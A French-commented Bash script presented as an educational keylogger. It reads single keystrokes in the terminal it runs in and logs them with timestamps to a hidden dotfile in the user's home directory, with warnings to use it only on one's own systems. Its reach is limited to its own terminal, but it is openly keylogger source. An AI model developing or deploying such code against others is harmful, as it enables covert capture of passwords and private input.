#!/bin/bash

# Keylogger pédagogique en Shell
# AVERTISSEMENT: À utiliser uniquement sur vos propres systèmes
# L'utilisation non autorisée de cet outil est illégale

LOG_FILE="${HOME}/.keylog_$(date +%Y%m%d_%H%M%S).txt"
RUNNING_FILE="/tmp/keylogger.pid"

function banner() {
    echo "==========================================="
    echo "  Keylogger Shell - Version 1.0"
    echo "  À des fins pédagogiques uniquement"
    echo "==========================================="
    echo ""
}

function check_running() {
    if [ -f "$RUNNING_FILE" ]; then
        echo "[ERREUR] Un keylogger est déjà en cours d'exécution."
        echo "PID: $(cat $RUNNING_FILE)"
        exit 1
    fi
}

function start_logging() {
    banner
    check_running
    
    echo $$ > "$RUNNING_FILE"
    echo "[INFO] Démarrage du keylogger..."
    echo "[INFO] Fichier de log: $LOG_FILE"
    echo "[INFO] PID: $$"
    echo "[INFO] Appuyez sur Ctrl+C pour arrêter"
    echo ""
    echo "[Démarré le $(date)]" >> "$LOG_FILE"
    
    while true; do
        read -rsn1 key
        timestamp=$(date +"%Y-%m-%d %H:%M:%S")
        
        if [ -z "$key" ]; then
            echo "[$timestamp] <ENTER>" >> "$LOG_FILE"
        elif [ "$key" = $'\x7f' ]; then
            echo "[$timestamp] <BACKSPACE>" >> "$LOG_FILE"
        elif [ "$key" = $'\t' ]; then
            echo "[$timestamp] <TAB>" >> "$LOG_FILE"
        elif [ "$key" = $'\x1b' ]; then
            echo "[$timestamp] <ESC>" >> "$LOG_FILE"
        else
            echo "[$timestamp] $key" >> "$LOG_FILE"
        fi
    done
}

function stop_logging() {
    echo ""
    echo "[INFO] Arrêt du keylogger..."
    echo "[Arrêté le $(date)]" >> "$LOG_FILE"
    rm -f "$RUNNING_FILE"
    echo "[INFO] Log sauvegardé: $LOG_FILE"
    exit 0
}

trap stop_logging SIGINT SIGTERM

if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
    banner
    echo "Usage: $0"
    echo ""
    echo "Ce script capture les touches saisies dans le terminal actuel."
    echo "Les logs sont enregistrés dans: ~/.keylog_YYYYMMDD_HHMMSS.txt"
    echo ""
    echo "AVERTISSEMENT LÉGAL:"
    echo "  - Utilisez uniquement sur vos propres systèmes"
    echo "  - L'usage non autorisé est illégal"
    echo "  - À des fins éducatives uniquement"
    echo ""
    exit 0
fi

start_logging
